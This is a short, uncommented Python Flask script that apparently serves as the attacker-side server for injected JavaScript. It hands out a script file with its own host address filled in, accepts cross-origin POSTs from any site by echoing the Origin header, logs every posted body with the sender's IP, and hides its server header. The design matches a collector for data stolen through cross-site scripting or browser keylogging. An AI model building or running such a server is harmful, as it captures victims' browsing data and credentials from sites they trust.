from flask import Flask, request, make_response
from datetime import datetime
import sys

port = 8091
log = open('server.log', 'a')
script_location = './a.js'


class myFlask(Flask):
    def process_response(self, response):
        response.headers['server'] = 'Generic'
        return(response)

app = myFlask(__name__, static_url_path='')

@app.route('/<a>', methods=['GET'])
def script(a):
    host = request.headers.get('host')
    if len(host) < 1:
        host = request.headers.get('Host')
    script = open(script_location).read()
    if len(host) > 0:
        script = script.replace('myserverhere', host)
    resp = make_response(script)
    resp.headers['Content-Type'] = 'application/javascript; charset=utf-8'
    return resp


@app.route('/', methods= ['POST'])
def hello():
    log.write('* [' + datetime.now().strftime('%d/%m/%Y %H:%M:%S') + '] connection from: ' + request.remote_addr + '\n')
    log.write(request.get_data().decode() + '\n')
    log.flush()
    resp = make_response('1')
    origin = request.headers.get('Origin')
    if len(origin) < 1:
        origin = request.headers.get('origin')
    if len(origin) > 0:
        resp.headers['Access-Control-Allow-Origin'] = origin
    return resp


app.handle_http_exception = hello
app.register_error_handler(400, hello)


if len(sys.argv) > 1:
    port = sys.argv[1]
app.run(port=port, host='0.0.0.0')

